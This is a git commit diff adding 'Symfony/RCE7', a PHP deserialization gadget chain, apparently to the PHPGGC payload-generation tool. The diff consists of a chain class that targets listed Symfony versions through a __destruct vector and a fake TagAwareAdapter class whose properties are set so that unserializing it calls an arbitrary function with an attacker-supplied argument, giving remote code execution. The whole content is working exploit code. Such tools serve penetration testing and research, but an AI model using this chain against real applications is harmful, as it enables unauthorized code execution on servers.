75dcc089a65f450660590905f0314bb37c2da4e6
cfreal <folcharles@gmail.com>
2023-01-30 19:34:01 +0100

    Added Symfony/RCE7

---
+++ gadgetchains/Symfony/RCE/7/chain.php
@@ -0,0 +1,18 @@
+<?php
+
+namespace GadgetChain\Symfony;
+
+class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+{
+    public static $version = 'v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7';
+    public static $vector = '__destruct';
+    public static $author = 'CyanM0un';
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \Symfony\Component\Cache\Adapter\TagAwareAdapter($function,$parameter); 
+    }
+}
---
+++ gadgetchains/Symfony/RCE/7/gadgets.php
@@ -0,0 +1,12 @@
+<?php
+namespace Symfony\Component\Cache\Adapter{
+    class TagAwareAdapter{
+        private $deferred;
+        private $getTagsByKey;
+
+        function __construct($function,$parameter){
+            $this->deferred = $parameter;
+            $this->getTagsByKey = $function;
+        }
+    }
+}
